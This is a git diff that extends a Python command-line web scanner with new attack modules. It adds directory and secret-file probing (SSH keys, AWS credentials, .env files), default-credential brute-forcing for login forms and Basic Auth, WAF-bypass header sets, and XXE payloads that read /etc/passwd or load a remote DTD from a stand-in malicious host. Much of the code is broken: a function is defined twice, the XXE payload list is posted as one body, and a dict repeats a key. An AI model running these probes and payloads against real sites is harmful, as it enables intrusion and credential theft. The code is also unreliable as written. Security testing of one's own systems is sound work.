@@ -40,8 +40,22 @@ def display_menu():
     print("\033[1;34m11.\033[1;m Open Redirect Testing")
     print("\033[1;34m12.\033[1;m Command Injection Testing")
     print("\033[1;34m13.\033[1;m CVE Exploit Checker")
-    print("\033[1;34m14.\033[1;m Exit")
-    choice = input("\033[1;34mEnter options (1-14): \033[1;m")
+    print("\033[1;34m14.\033[1;m Wordlist Customization for Bruteforcing")
+    print("\033[1;34m15.\033[1;m Parameter Discovery")
+    print("\033[1;34m16.\033[1;m WAF Detection")
+    print("\033[1;34m17.\033[1;m Rate Limiting/Throttling Test")
+    print("\033[1;34m18.\033[1;m CORS Misconfiguration Testing")
+    print("\033[1;34m19.\033[1;m Weak Password Detection")
+    print("\033[1;34m20.\033[1;m HTTP Methods Testing")
+    print("\033[1;34m21.\033[1;m API Security Testing")
+    print("\033[1;34m22.\033[1;m DNS Rebinding Testing")
+    print("\033[1;34m23.\033[1;m Information Disclosure Detection")
+    print("\033[1;34m24.\033[1;m XML External Entity (XXE) Testing")
+    print("\033[1;34m25.\033[1;m Basic Authentication Bruteforce")
+    print("\033[1;34m26.\033[1;m WebSocket Security Testing")
+    print("\033[1;34m27.\033[1;m Parameter Pollution Testing")
+    print("\033[1;34m28.\033[1;m Exit")
+    choice = input("\033[1;34mEnter options (1-28): \033[1;m")
     return choice
 
 def url_validator(url):
@@ -438,6 +452,419 @@ async def cve_exploit_checker(domain):
         print(f"Checking {cve}...")
         # Simulate a check; integrate CVE vulnerability databases or APIs here
         print(f"{cve} check completed. (Implement real checks as needed)")
+        
+async def wordlist_customization_bruteforce(url):
+    print(f"Starting directory and file bruteforcing on {url}")
+    
+async def wordlist_customization_bruteforce(url):
+    print(f"Starting directory and file bruteforcing on {url}")
+    
+    items = [
+        "admin", "config", "backup", "login", "dashboard", "private", "uploads", "images",
+        "js", "css", "assets", "files", "data", "database", "api", "secure", "secret",
+        "tmp", "logs", "error", "test", "old", "new", "dev", "staging", "docs", "download",
+        "public", "internal", "include", "includes", "lib", "libs", "cgi-bin", "static",
+        "wordpress", "wp-admin", "wp-content", "wp-includes", "joomla", "drupal", "magento",
+        "node_modules", "vendor", "laravel", "symfony", "django", "rails", "core", "modules",
+        ".env", "environment", ".git", ".svn", ".htaccess", ".htpasswd", ".DS_Store", "composer.lock",
+        "composer.json", "package.json", "yarn.lock", "package-lock.json", "README.md", "LICENSE",
+        "backup.sql", "db_backup", "database.sql", "dump", "old_backup", "user_backup",
+        "database_backup", "backup_old", "bak", "backups", "export", "import",
+        "debug.log", "error.log", "access.log", "info.log", "system.log", "log", "logs", "temp",
+        "tmp", "session", "cache", "sessions", "errors", "debug", "temp_files", "archive",
+        "staging", "qa", "dev", "development", "testing", "sandbox", "demo", "mock", "samples",
+        "user", "users", "members", "client", "customer", "account", "profile", "auth", "authentication",
+        "register", "signup", "signin", "logout", "logout", "forgot", "forgot_password",
+        "config.php", "config.json", "settings.php", "settings.json", "appsettings.json", "config.xml",
+        "config.ini", "web.config", "application.config", "local.config", "default.config",
+        "analytics", "statistics", "stat", "stats", "tracking", "report", "reports", "mail", "email",
+        "message", "messages", "contact", "feedback", "support", "help", "faq", "terms", "policy",
+        "certs", "certificates", "keys", "key", "ssl", "crypto", "hash", "csrf", "token", "auth",
+        "docs", "documentation", "assets", "themes", "plugins", "extensions", "addons", "widgets",
+        "sitemap", "robots.txt", "humans.txt", "crossdomain.xml", "ads.txt", "browserconfig.xml",
+        "apple-touch-icon.png", "favicon.ico", "favicon.png"
+    ]
+
+    
+    async with aiohttp.ClientSession() as session:
+        found_items = []
+        for item in items:
+            test_url = urljoin(url, item)
+            try:
+                async with session.get(test_url) as response:
+                    if response.status == 200:
+                        print(f"Found: {test_url}")
+                        found_items.append(test_url)
+                    elif response.status == 403:
+                        print(f"Forbidden (403): {test_url} (but directory likely exists)")
+            except Exception as e:
+                print(f"Error accessing {test_url}: {e}")
+        
+        if found_items:
+            with open("output/bruteforce_results.txt", "w") as file:
+                file.write("\n".join(found_items))
+            print("\nResults saved to output/bruteforce_results.txt")
+        else:
+            print("\nNo accessible items found in bruteforce attempt.")
+
+async def parameter_discovery(url):
+    print(f"Starting parameter discovery on {url}")
+    params = [
+        "id", "page", "search", "category", "q", "query", "lang", "token", "session", "user",
+        "start", "limit", "offset", "count", "size", "results", "per_page", "page_number", 
+        "sort", "order", "orderby", "sortby", "direction", "asc", "desc",
+        "filter", "type", "status", "state", "view", "mode", "show", "display", "format", "group",
+        "userid", "username", "email", "profile_id", "account", "user_id", "member_id",
+        "date", "start_date", "end_date", "timestamp", "time", "created", "modified", "updated",
+        "auth", "access_token", "api_key", "csrf_token", "oauth", "sso", "key", "secret",
+        "locale", "country", "lang", "language", "region", "location", "city", "state", "zip",
+        "product", "product_id", "item", "item_id", "sku", "cart", "cart_id", "checkout", "quantity",
+        "share", "like", "tweet", "comment", "post", "follow", "tag", "hashtag",
+        "input", "name", "value", "field", "text", "message", "content", "title", "body", "description",
+        "file", "file_id", "filename", "path", "dir", "directory", "folder", "upload", "download",
+        "action", "submit", "confirm", "callback", "redirect", "url", "path", "referer",
+        "module", "handler", "service", "api", "method", "request", "response", "version"
+    ]
+    async with aiohttp.ClientSession() as session:
+        for param in params:
+            try:
+                async with session.get(f"{url}?{param}=test") as response:
+                    if response.status == 200:
+                        print(f"Parameter {param} appears valid at {response.url}")
+            except Exception as e:
+                print(f"Error with parameter {param}: {e}")
+
+async def waf_detection(url):
+    print(f"Checking for Web Application Firewall (WAF) presence on {url}")
+    
+    waf_headers = [
+        {"User-Agent": "badbot"},
+        {"User-Agent": "sqlmap"},
+        {"User-Agent": "crawler"},
+        {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
+        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 sqlmap"},
+        {"X-Original-URL": "/"},
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Forwarded-For": "8.8.8.8"},
+        {"X-Forwarded-For": "10.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Client-IP": "127.0.0.1"},
+        {"X-Remote-IP": "127.0.0.1"},
+        {"X-Remote-Addr": "127.0.0.1"},
+        {"Forwarded": "for=127.0.0.1"},
+        {"X-WAF-Detection": "Test"},
+        {"X-WAF-Bypass": "True"},
+        {"X-WAF-Test": "bypass"},
+        {"X-Custom-IP-Authorization": "127.0.0.1"},
+        {"X-Requested-With": "XMLHttpRequest"},
+        {"True-Client-IP": "127.0.0.1"},
+        {"CF-Connecting-IP": "127.0.0.1"},
+        {"X-Cluster-Client-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"User-Agent": "Wget/1.20.3"},
+        {"User-Agent": "curl/7.68.0"},
+        {"User-Agent": "nmap"},
+        {"User-Agent": "sqlmap/1.5.4"},
+        {"User-Agent": "Mozilla/5.0 zgrab/0.x"},
+        {"User-Agent": "nikto"},
+        {"Referer": "https://malicious-site.com"},
+        {"Origin": "https://malicious-site.com"},
+        {"X-Forwarded-Proto": "https"},
+        {"X-Forwarded-Host": "evil.com"},
+        {"X-Host": "127.0.0.1"},
+        {"X-Forwarded-Scheme": "javascript"},
+        {"Forwarded": "for=127.0.0.1; proto=https"},
+        {"X-HTTP-Method-Override": "DELETE"},
+        {"Content-Type": "application/json; charset=UTF-7"},
+        {"X-Content-Type-Options": "nosniff"},
+        {"X-XSS-Protection": "0"},
+        {"Cache-Control": "no-store"},
+    ]
+    
+    async with aiohttp.ClientSession() as session:
+        for headers in waf_headers:
+            try:
+                async with session.get(url, headers=headers) as response:
+                    if response.status in [403, 406, 429]:
+                        print(f"Potential WAF detected with headers: {headers}")
+                        return
+                    elif 'Server' in response.headers and "cloudflare" in response.headers["Server"].lower():
+                        print("Cloudflare WAF detected.")
+                        return
+                    elif 'X-CDN' in response.headers and "incapsula" in response.headers["X-CDN"].lower():
+                        print("Incapsula WAF detected.")
+                        return
+                    elif 'X-Sucuri-ID' in response.headers:
+                        print("Sucuri WAF detected.")
+                        return
+            except Exception as e:
+                print(f"Error during WAF detection with headers {headers}: {e}")
+    print("No WAF detected.")
+
+async def rate_limiting_test(url, requests_per_second=5):
+    print(f"Testing rate limiting on {url}")
+    async with aiohttp.ClientSession() as session:
+        for _ in range(requests_per_second):
+            try:
+                async with session.get(url) as response:
+                    print(f"Request status: {response.status}")
+            except Exception as e:
+                print(f"Error during rate limit test: {e}")
+            await asyncio.sleep(1 / requests_per_second)
+
+async def cors_misconfiguration_testing(domain):
+    print(f"Checking CORS configuration for {domain}")
+    headers = {"Origin": "https://malicious-site.com"}
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.options(f"https://{domain}", headers=headers) as response:
+                if "Access-Control-Allow-Origin" in response.headers:
+                    print("Potential CORS misconfiguration detected.")
+        except Exception as e:
+            print(f"Error checking CORS: {e}")
+
+async def weak_password_detection(url):
+    print(f"Starting weak password detection on {url}")
+    passwords = ["password", "admin123", "letmein", "password1"]
+    async with aiohttp.ClientSession() as session:
+        for password in passwords:
+            try:
+                async with session.post(url, data={'username': 'admin', 'password': password}) as response:
+                    if response.status == 200:
+                        print(f"Weak password found: {password}")
+                        break
+            except Exception as e:
+                print(f"Error in weak password test: {e}")
+
+async def http_methods_testing(url):
+    print(f"Testing HTTP methods on {url}")
+    methods = ["OPTIONS", "PUT", "DELETE"]
+    async with aiohttp.ClientSession() as session:
+        for method in methods:
+            try:
+                async with session.request(method, url) as response:
+                    print(f"{method} method allowed, status: {response.status}")
+            except Exception as e:
+                print(f"Error testing {method}: {e}")
+
+async def api_security_testing(url):
+    print(f"Starting API security testing on {url}")
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.get(url) as response:
+                if response.status == 200:
+                    print(f"API endpoint {url} is accessible without authentication.")
+        except Exception as e:
+            print(f"Error testing API security: {e}")
+
+async def dns_rebinding_testing(domain):
+    print(f"Testing for DNS rebinding vulnerabilities on {domain}")
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "keep-alive",
+        "Referer": "https://malicious-site.com",
+        "Origin": "https://malicious-site.com",
+        "X-Forwarded-For": "127.0.0.1",
+        "X-Real-IP": "127.0.0.1",
+        "X-Client-IP": "127.0.0.1",
+        "X-Remote-IP": "127.0.0.1",
+        "X-Remote-Addr": "127.0.0.1",
+        "Forwarded": "for=127.0.0.1",
+        "Cache-Control": "no-store, no-cache, must-revalidate",
+        "Pragma": "no-cache",
+        "Expires": "0",
+        "X-WAF-Detection": "Test",
+        "X-WAF-Bypass": "True",
+        "X-Custom-IP-Authorization": "127.0.0.1",
+        "X-Requested-With": "XMLHttpRequest",
+        "X-HTTP-Method-Override": "DELETE",
+        "Access-Control-Allow-Origin": "*",
+        "Access-Control-Allow-Credentials": "true",
+        "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+        "Access-Control-Allow-Headers": "Content-Type, Authorization",
+        "Origin": "https://malicious-site.com",
+        "Content-Disposition": "form-data; name='file'; filename='test.txt'",
+        "Content-Type": "multipart/form-data",
+        "X-Content-Type-Options": "nosniff",
+        "X-XSS-Protection": "0",
+        "Content-Security-Policy": "default-src 'self'; script-src 'none';",
+        "Authorization": "Bearer testtoken123",
+        "X-Api-Key": "testapikey123",
+        "X-Auth-Token": "testauthtoken123",
+        "X-Test-Header": "test",
+        "X-Powered-By": "malicious-software",
+        "X-Debug-Mode": "true",
+        "X-Environment": "Production",
+        "X-Original-URL": "/admin",
+        "X-Forwarded-Proto": "https",
+        "X-Forwarded-Host": "evil.com",
+        "True-Client-IP": "127.0.0.1",
+        "CF-Connecting-IP": "127.0.0.1",
+        "X-Cluster-Client-IP": "127.0.0.1"
+    }
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.get(f"http://{domain}", headers=headers) as response:
+                print(f"Rebinding response status: {response.status}")
+        except Exception as e:
+            print(f"Error in DNS rebinding testing: {e}")
+
+async def information_disclosure_detection(url):
+    print(f"Checking for information disclosure at {url}")
+    disclosure_files = [
+        "/.env", "/config.json", "/config.php", "/settings.py", "/settings.php", "/localsettings.php",
+        "/config.yaml", "/config.yml", "/config.xml", "/application.properties", "/appsettings.json",
+        "/.htaccess", "/.htpasswd", "/web.config", "/database.yml", "/db_config.php",
+        "/debug.log", "/error.log", "/access.log", "/system.log", "/app.log", "/server.log", "/mysql.log",
+        "/database.log", "/apache.log", "/nginx.log", "/php_error.log", "/stdout.log", "/stderr.log",
+        "/.git", "/.gitignore", "/.git/config", "/.svn", "/.hg", "/.bzr", "/.cvs", "/.idea",
+        "/.vscode", "/.DS_Store", "/.editorconfig", "/package.json", "/package-lock.json", "/composer.json",
+        "/composer.lock", "/yarn.lock", "/Gemfile", "/Gemfile.lock", "/Pipfile", "/Pipfile.lock",
+        "/backup.zip", "/backup.tar.gz", "/db_backup.sql", "/database_backup.sql", "/website_backup.tar",
+        "/old_version", "/backup_old", "/site_backup.bak", "/dump.sql", "/db.sql", "/database.sql",
+        "/database.sqlite", "/db.sqlite3", "/data.json", "/data.xml", "/data.csv", "/dump.rdb", "/redis.rdb",
+        "/backup.rdb", "/db.json", "/db.xml", "/passwords.txt", "/creds.txt", "/credentials.json",
+        "/.bash_history", "/.ssh/id_rsa", "/.ssh/authorized_keys", "/.aws/credentials", "/.npmrc", "/.docker/config.json",
+        "/private.key", "/private.pem", "/jwt.key", "/jwt_token.key", "/cert.pem", "/cert.key", "/id_rsa",
+        "/wp-config.php", "/wp-settings.php", "/wp-content/debug.log", "/wp-includes/version.php", 
+        "/config/database.php", "/config/app.php", "/config/production.php", "/config/development.php",
+        "/settings.ini", "/db.ini", "/config/db.php", "/system/config/config.php", "/config/config.ini",
+        "/.env.local", "/.env.production", "/.env.development", "/firebase.json", "/amplify.yml", "/app.yaml",
+        "/app.yml", "/cloudbuild.yaml", "/docker-compose.yml", "/docker-compose.override.yml",
+        "/Dockerfile", "/terraform.tf", "/terraform.tfvars", "/serverless.yml", "/secrets.yml",
+        "/results.json", "/scan_report.html", "/report.txt", "/audit.log", "/scan_results.log",
+        "/vulnerabilities.csv", "/vuln_report.json", "/vuln_scan.log"
+    ]
+    async with aiohttp.ClientSession() as session:
+        for file in disclosure_files:
+            try:
+                async with session.get(urljoin(url, file)) as response:
+                    if response.status == 200:
+                        print(f"Found potential information disclosure at: {file}")
+            except Exception as e:
+                print(f"Error in information disclosure detection: {e}")
+
+async def xxe_testing(url):
+    print(f"Starting XXE testing on {url}")
+    
+    xxe_payload = [
+        """<?xml version="1.0"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://malicious-site.com/evil.dtd">
+        %remote;
+        ]>
+        <root>&send;</root>""",
+        
+        """<?xml version="1.0"?>
+        <!DOCTYPE test [
+        <!ELEMENT test ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+        <test>&xxe;</test>""",
+
+        """<?xml version="1.0"?>
+        <!DOCTYPE data [
+        <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
+        <data>&xxe;</data>""",
+
+        """<?xml version="1.0"?>
+        <!DOCTYPE replace [
+        <!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+        ]>
+        <data>&ent;</data>"""
+    ]
+    
+    headers = {"Content-Type": "application/xml"}
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post(url, data=xxe_payload, headers=headers) as response:
+                if response.status == 200:
+                    print("XXE vulnerability may exist.")
+        except Exception as e:
+            print(f"Error in XXE testing: {e}")
+
+async def basic_auth_bruteforce(url):
+    print(f"Starting basic authentication bruteforce on {url}")
+    auth_combinations = [
+    ("admin", "admin"), ("user", "password"), ("root", "toor"),
+    ("admin", "1234"), ("test", "test"), ("guest", "guest"),
+    ("root", "root"), ("user", "user"), ("administrator", "admin123"),
+    ("manager", "manager"), ("test", "123456"), ("webmaster", "webmaster"),
+    ("api", "api123"), ("service", "service"), ("demo", "demo"),
+    ("user", "welcome"), ("sysadmin", "password1"), ("siteadmin", "admin1234")
+    ]
+    async with aiohttp.ClientSession() as session:
+        for username, password in auth_combinations:
+            try:
+                async with session.get(url, auth=aiohttp.BasicAuth(username, password)) as response:
+                    if response.status == 200:
+                        print(f"Valid credentials found: {username}/{password}")
+                        break
+            except Exception as e:
+                print(f"Error during basic auth bruteforce: {e}")
+
+async def websocket_security_testing(url):
+    print(f"Testing WebSocket security on {url}")
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.ws_connect(url) as ws:
+                await ws.send_str("ping")
+                msg = await ws.receive()
+                print(f"Received message: {msg.data}")
+        except Exception as e:
+            print(f"Error in WebSocket testing: {e}")
+async def parameter_pollution_testing(url):
+    print(f"Testing parameter pollution on {url}")
+
+    payloads = [
+        "id=1&id=2",
+        "user=admin&user=guest",
+        "page=1&page=2",
+        "sort=asc&sort=desc",
+        "filter=name&filter=age",
+        "category=books&category=electronics",
+        "type=public&type=private",
+        "lang=en&lang=es",
+        "token=abc123&token=xyz456",
+        "date=2022-01-01&date=2022-12-31",
+        "limit=10&limit=100",
+        "session=valid&session=invalid",
+        "amount=100&amount=-100",
+        "role=user&role=admin",
+        "debug=true&debug=false",
+        "auth=token123&auth=token456",
+        "id[]=1&id[]=2",
+        "price_min=0&price_max=100&price_min=50&price_max=200",
+        "order_by=date&order_by=name",
+        "api_key=test1&api_key=test2",
+        "search=apple&search=banana",
+        "query=test&query=",
+        "active=1&active=0",
+        "visible=true&visible=false",
+        "include=all&include=none",
+        "checkout=enabled&checkout=disabled",
+        "currency=USD&currency=EUR",
+        "redirect=true&redirect=false",
+        "username=guest&username=admin",
+        "action=delete&action=update",
+        "discount=10&discount=20",
+        "order=asc&order=desc",
+        "q=search1&q=search2",
+        "range=10-20&range=20-30",
+        "select=first&select=last",
+        "id=1&user=admin&id=2&user=guest",
+        "limit=1&limit=1000",
+    ]
+
+    async with aiohttp.ClientSession() as session:
+        for payload in payloads:
+            try:
+                async with session.get(f"{url}?{payload}") as response:
+                    print(f"Test payload: {payload} -> Status: {response.status}")
+            except Exception as e:
+                print(f"Error with payload {payload}: {e}")
 
 async def main():
     display_banner()
@@ -487,6 +914,60 @@ async def main():
             domain = input("Enter the domain for CVE exploit checking (e.g., example.com): ")
             await cve_exploit_checker(domain)
         elif choice == "14":
+            url = input("Enter the URL for directory and file bruteforcing (e.g., https://example.com): ")
+            if not url.startswith("http://") and not url.startswith("https://"):
+                print("Invalid URL format. Please include 'http://' or 'https://'")
+                continue
+            print("\nStarting bruteforce with built-in wordlist of common directories and files...\n")
+            await wordlist_customization_bruteforce(url)
+            print("\nBruteforcing completed.")
+        elif choice == "15":
+            url = input("Enter the URL for parameter discovery (e.g., https://example.com): ")
+            await parameter_discovery(url)
+        elif choice == "16":
+            url = input("Enter the URL to detect WAF presence (e.g., https://example.com): ")
+            if not url.startswith("http://") and not url.startswith("https://"):
+                print("Invalid URL format. Please include 'http://' or 'https://'")
+                continue
+            print(f"\nInitiating WAF detection on: {url}")
+            print("Using custom headers and patterns to attempt WAF detection...\n")
+            await waf_detection(url)
+            print("\nWAF detection completed.")
+        elif choice == "17":
+            url = input("Enter the URL for rate limiting test (e.g., https://example.com): ")
+            requests_per_second = int(input("Enter requests per second to simulate: "))
+            await rate_limiting_test(url, requests_per_second)
+        elif choice == "18":
+            domain = input("Enter the domain to test for CORS misconfiguration (e.g., example.com): ")
+            await cors_misconfiguration_testing(domain)
+        elif choice == "19":
+            url = input("Enter the URL for weak password detection (e.g., https://example.com/login): ")
+            await weak_password_detection(url)
+        elif choice == "20":
+            url = input("Enter the URL for HTTP methods testing (e.g., https://example.com): ")
+            await http_methods_testing(url)
+        elif choice == "21":
+            url = input("Enter the API endpoint URL for security testing (e.g., https://example.com/api): ")
+            await api_security_testing(url)
+        elif choice == "22":
+            domain = input("Enter the domain for DNS rebinding testing (e.g., example.com): ")
+            await dns_rebinding_testing(domain)
+        elif choice == "23":
+            url = input("Enter the URL for information disclosure testing (e.g., https://example.com): ")
+            await information_disclosure_detection(url)
+        elif choice == "24":
+            url = input("Enter the URL for XXE testing (e.g., https://example.com): ")
+            await xxe_testing(url)
+        elif choice == "25":
+            url = input("Enter the URL for Basic Authentication Bruteforce (e.g., https://example.com): ")
+            await basic_auth_bruteforce(url)
+        elif choice == "26":
+            url = input("Enter the WebSocket URL for security testing (e.g., wss://example.com/socket): ")
+            await websocket_security_testing(url)
+        elif choice == "27":
+            url = input("Enter the URL for parameter pollution testing (e.g., https://example.com): ")
+            await parameter_pollution_testing(url)
+        elif choice == "28":
             print("Exiting...")
             break
         else:
